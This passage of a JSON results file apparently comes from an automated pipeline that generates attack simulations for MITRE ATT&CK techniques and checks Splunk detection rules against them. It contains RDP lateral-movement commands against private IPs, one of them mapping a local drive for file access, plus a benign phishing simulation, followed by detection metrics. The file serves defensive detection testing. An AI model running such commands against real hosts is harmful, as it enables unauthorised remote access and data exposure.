      "safety_level": "low",
      "expected_behavior": "Opens a Remote Desktop Connection window and attempts to connect to 192.168.1.100 over port 3389. User will be prompted for credentials.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:13.232465",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "4974b286-d7ba-459c-838a-e2226a318026",
      "ttp_id": "8b6bf09c-26a1-4703-b453-66a293b550be",
      "technique_id": "8b6bf09c-26a1-4703-b453-66a293b550be",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "echo full address:s:192.168.1.100\\nusername:s:Administrator\\nprompt for credentials:i:1 > $env:TEMP\\connect.rdp && mstsc.exe $env:TEMP\\connect.rdp",
      "description": "Create a temporary RDP configuration file with predefined settings and launch it",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Generates a minimal .RDP file in the TEMP directory with target address and username, then launches mstsc.exe with that file. Prompts user for credentials due to 'prompt for credentials:i:1'.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:13.232465",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "67f2dd55-a0ab-4765-be4d-bc8bf5b09215",
      "ttp_id": "8b6bf09c-26a1-4703-b453-66a293b550be",
      "technique_id": "8b6bf09c-26a1-4703-b453-66a293b550be",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '$env:TEMP\\\\hidden_rdp' -ErrorAction SilentlyContinue; Set-Content -Path '$env:TEMP\\\\hidden_rdp\\\\tunnel.rdp' -Value 'full address:s:10.0.0.5\\nscreen mode id:i:2\\ndesktopwidth:i:1024\\ndesktopheight:i:768\\nsession bpp:i:32\\nredirectclipboard:i:1\\nredirectposdevices:i:0\\nautoreconnection enabled:i:1\\nusername:s:admin\\nprompt for credentials:i:1'; mstsc.exe '$env:TEMP\\\\hidden_rdp\\\\tunnel.rdp'\"",
      "description": "Create a hidden RDP configuration with custom display and redirection settings in a temporary subdirectory and launch the connection",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a directory in TEMP to store an RDP file with specific session settings including screen resolution and clipboard redirection. Then launches mstsc.exe using this configuration. User is prompted for credentials. The use of PowerShell is necessary for multi-line file creation but relies only on built-in cmdlets.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:13.232465",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "79ead71b-11f3-41a1-bb34-aa966717aeac",
      "ttp_id": "8b6bf09c-26a1-4703-b453-66a293b550be",
      "technique_id": "8b6bf09c-26a1-4703-b453-66a293b550be",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "Lateral Movement",
      "platform": "linux",
      "command": "rdesktop 192.168.1.100",
      "description": "Initiate a basic RDP connection to a remote host using rdesktop",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Attempts to establish an RDP session with the target IP on default port 3389; prompts for credentials interactively if required",
      "source": "langchain",
      "generated_at": "2025-12-31T22:29:43.440432",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "fc1a8b36-6c2b-4f23-a435-abb4ca3bfae9",
      "ttp_id": "8b6bf09c-26a1-4703-b453-66a293b550be",
      "technique_id": "8b6bf09c-26a1-4703-b453-66a293b550be",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "Lateral Movement",
      "platform": "linux",
      "command": "xfreerdp /u:'admin' /v:192.168.1.100",
      "description": "Initiate an RDP connection using xfreerdp with a specified username",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Connects to the target system via RDP using FreeRDP, supplying a username; prompts for password interactively",
      "source": "langchain",
      "generated_at": "2025-12-31T22:29:43.440432",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "c962d8ff-c263-4219-834b-27f0cd1e1545",
      "ttp_id": "8b6bf09c-26a1-4703-b453-66a293b550be",
      "technique_id": "8b6bf09c-26a1-4703-b453-66a293b550be",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "Lateral Movement",
      "platform": "linux",
      "command": "xfreerdp /u:'admin' /p:'dummy_password' /v:192.168.1.100 /drive:share,/tmp",
      "description": "Advanced RDP connection with credential simulation and disk redirection to exfiltrate or access local files",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Establishes an RDP session with credentials passed (simulated), and maps a local directory (/tmp) as a network drive in the remote session; this mimics lateral movement with data access",
      "source": "langchain",
      "generated_at": "2025-12-31T22:29:43.440432",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "b8f9b5ac-a0b9-4a23-87df-db026f08daba",
      "ttp_id": "b138d48b-7ae0-449d-9e69-335aafd0798d",
      "technique_id": "b138d48b-7ae0-449d-9e69-335aafd0798d",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "echo 'echo \"This is a test phishing payload simulation\"' > $HOME/phishing_script.sh && chmod +x $HOME/phishing_script.sh && $HOME/phishing_script.sh",
      "description": "Basic phishing simulation: creates a script that prints a benign message, mimicking user-induced execution of a downloaded script.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a shell script in the user's home directory, makes it executable, and runs it. Output is a test message to stdout.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:38:29.897554",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.621,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "1ba8bf74-0a58-4198-9550-fb2cacc3a0f2",
      "ttp_id": "T1572",
      "detected": true,
      "events_found": 28,
      "query_time_ms": 414.00000000000006,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "6110405c-02b1-4d82-88f5-82c53f2ca0fe",
      "ttp_id": "T1059",
      "detected": true,
      "events_found": 3,
      "query_time_ms": 512.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "49dc7189-e520-430a-86da-c52e0758a5d8",
      "ttp_id": "T1005",
      "detected": true,
      "events_found": 22,
      "query_time_ms": 1088.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "95c7a40b-24bb-4dc4-aed9-a1f4675a7065",
      "ttp_id": "T1027",
      "detected": true,
      "events_found": 1,
      "query_time_ms": 381.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "52ed72a6-6d1e-4a1d-9398-53781da2f786",
      "ttp_id": "T1071",
      "detected": true,
      "events_found": 31,
      "query_time_ms": 429.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "5bd2743d-da59-4e54-87ab-68b32f1786f2",
      "ttp_id": "T1041",
      "detected": true,
      "events_found": 4,
      "query_time_ms": 1241.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "19805a2c-1734-4213-87d6-c23da0217a76",
      "ttp_id": "T1204",
      "detected": true,
      "events_found": 27,
      "query_time_ms": 487.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "75da819e-8ca0-432d-92a8-8243adce0533",
      "ttp_id": "T1055",
      "detected": true,
      "events_found": 95,
      "query_time_ms": 450.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "4427e28e-f35f-4eab-9c31-6e4b9c9ef282",
      "ttp_id": "T1190",
      "detected": true,
      "events_found": 69,
      "query_time_ms": 449.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "7e0987e4-2b23-483e-8c2f-0e3646ea48f5",
      "ttp_id": "T1082",
      "detected": true,
      "events_found": 7,
      "query_time_ms": 458.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "c8fe03f5-4cb9-4b48-9a5b-791271976077",
      "ttp_id": "T1574",
      "detected": true,
      "events_found": 5,
      "query_time_ms": 374.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "48233f90-545c-4d4d-838d-0ca27bcd4cc5",
      "ttp_id": "T1562",
      "detected": true,
      "events_found": 9,
      "query_time_ms": 585.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "da8613c1-ca70-46ec-9ad0-0470b1336556",
      "ttp_id": "T1072",
      "detected": true,
      "events_found": 106,
      "query_time_ms": 545.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "9a0f720a-0980-40f1-8831-184c10b094c4",
      "ttp_id": "T1547",
      "detected": true,
      "events_found": 1,
      "query_time_ms": 427.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "a891309b-35d5-4d25-9083-8d8d9d4a7c3d",
      "ttp_id": "T1059.001",
      "detected": true,
      "events_found": 7,
      "query_time_ms": 955.0000000000001,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "f16b5d22-94cf-442a-9148-df7e0f791bd3",
      "ttp_id": "T1021",
      "detected": true,
      "events_found": 29,
      "query_time_ms": 413.00000000000006,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "f84a50d5-2df7-4ba4-b528-dfb5b47282ea",
      "ttp_id": "T1112",
      "detected": true,
      "events_found": 23,
      "query_time_ms": 591.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "f3f7024a-3f9a-4a3c-ab8d-5a14704462ac",
      "ttp_id": "T1543",
      "detected": true,
      "events_found": 26,
      "query_time_ms": 574.0000000000001,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "a7bb2ae9-5604-497b-9ffb-df4596f9a373",
      "ttp_id": "T1560",
      "detected": true,
      "events_found": 5,
      "query_time_ms": 1074.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "b55e2a7a-8ddf-4262-b1be-5a6f21d84d23",
      "ttp_id": "T1087",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Invalid SPL: Error in 'SearchOperator:regex': Usage: regex <field> (=|!=) <regex>."
    },
    {
      "rule_id": "6a4c0471-b38b-498c-bef0-34a8b9e1c1d6",
      "ttp_id": "T1021.001",
      "detected": true,
      "events_found": 6,
      "query_time_ms": 450.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "91c133e3-c0b3-4b72-9059-15e67a8677be",
      "ttp_id": "T1566",
      "detected": true,
      "events_found": 26,
      "query_time_ms": 659.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    }
  ],
  "siem_metrics": {
    "true_positives": 21,
    "false_positives": 0,
    "false_negatives": 1,
    "precision": 1.0,
    "detection_rate": 0.9545454545454546,
    "f1_score": 0.9767441860465117
  },
  "iterations": 1,
  "final_score": 0.6817391304347826,
  "final_report": {
    "total_ttps": 43,
    "optimized_ttps": 23,
    "generated_rules": 23,
    "generated_attacks": 96,
    "timestamp": "2026-01-01T05:42:21.893815"
  },
  "timestamp": "2026-01-01T05:42:21.896345",
  "benchmark_metrics": {
    "duration_s": 1091.5787258148193,
    "quality_score": 0.7257119165601023
  }
}